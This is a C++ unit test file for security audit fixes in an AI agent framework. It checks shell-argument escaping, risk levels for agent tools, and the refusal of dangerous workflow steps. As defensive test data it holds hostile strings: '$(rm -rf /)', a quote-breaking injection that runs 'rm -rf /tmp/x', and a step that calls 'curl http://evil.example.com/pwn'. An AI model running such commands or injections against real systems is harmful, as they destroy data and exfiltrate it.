// unit_plugin_audit_fixes：v0.52.7 子系统审计修复回归
//
// P0-1 git 注入：ShellArg::escape 单引号转义（含单引号/$()/; 元字符）
// P0-2 workflow：危险步骤拒执行
// P0-3 分级：code_exec/git_checkout(恢复文件)=Dangerous
// P1-2 git_status 短行不崩
#include <filesystem>
#include <string>

#include "nlohmann/json.hpp"
#include "thin_agent/core/PathValidator.h"
#include "thin_agent/core/WorkflowManager.h"

#include "test_macros.h"

using namespace thin_agent;

int main() {
  // ── P0-1: ShellArg::escape ──
  ASSERT_EQ("普通串原样包裹", ShellArg::escape("hello"), "'hello'");
  ASSERT_EQ("含单引号转义", ShellArg::escape("it's"),
            "'it'\\''s'");
  ASSERT_EQ("命令替换被字面量化", ShellArg::escape("$(rm -rf /)"),
            "'$(rm -rf /)'");
  ASSERT_EQ("反引号字面量化", ShellArg::escape("`id`"), "'`id`'");
  // 转义后的串放进 shell 无注入语义（用 system 验证太重——语义断言：
  // 转义产物不改变引号配对外的任何字符）
  std::string payload = "a'; rm -rf /tmp/x; '";
  const char kQ = 39;  // 单引号字符 ASCII 39
  std::string escaped = ShellArg::escape(payload);
  ASSERT_TRUE("注入 payload 被单引号整体包裹",
              escaped.front() == kQ && escaped.back() == kQ);

  // ── P0-3: 分级修正 ──
  ASSERT_TRUE("code_exec=Dangerous",
              tool_risk_of("code_exec", {}) == ToolRisk::Dangerous);
  nlohmann::json co_args;
  co_args["target"] = "src/main.cpp";
  co_args["branch"] = false;
  ASSERT_TRUE("git_checkout 恢复文件=Dangerous",
              tool_risk_of("git_checkout", co_args) == ToolRisk::Dangerous);
  nlohmann::json br_args;
  br_args["target"] = "develop";
  br_args["branch"] = true;
  ASSERT_TRUE("git_checkout 切分支=Mutating",
              tool_risk_of("git_checkout", br_args) == ToolRisk::Mutating);
  ASSERT_TRUE("git_commit 仍 Mutating（常规操作不升审批负担）",
              tool_risk_of("git_commit", {}) == ToolRisk::Mutating);

  // ── P0-2: workflow 危险步骤拒执行 ──
  {
    // 造一个带危险步骤的工作流（curl 外传=deny 子串）
    WorkflowDef wf;
    wf.name = "audit_test_wf";
    wf.description = "audit test";
    wf.max_retries = 3;
    WorkflowStep bad;
    bad.desc = "dangerous";
    bad.cmd = "curl http://evil.example.com/pwn";
    wf.post_code_steps.push_back(bad);
    WorkflowManager::instance().create(wf);
    auto r = WorkflowManager::instance().run("audit_test_wf", 1, "");
    ASSERT_TRUE("危险步骤被拒", !r.value("success", true));
    ASSERT_TRUE("拒绝原因正确",
                r.value("error", "").find("risk grading") != std::string::npos);
    WorkflowManager::instance().remove("audit_test_wf");

    // 良性步骤（白名单首词）照常执行
    WorkflowDef wf2;
    wf2.name = "audit_test_wf2";
    wf2.description = "audit test 2";
    wf2.max_retries = 3;
    WorkflowStep ok;
    ok.desc = "echo";
    ok.cmd = "echo audit_ok";
    wf2.post_code_steps.push_back(ok);
    WorkflowManager::instance().create(wf2);
    auto r2 = WorkflowManager::instance().run("audit_test_wf2", 1, "");
    ASSERT_TRUE("良性步骤放行", r2.value("success", false));
    ASSERT_TRUE("输出验证",
                r2.value("output", "").find("audit_ok") != std::string::npos
                || !r2.value("steps", nlohmann::json::array()).empty());
    WorkflowManager::instance().remove("audit_test_wf2");
  }

  return TEST_REPORT();
}
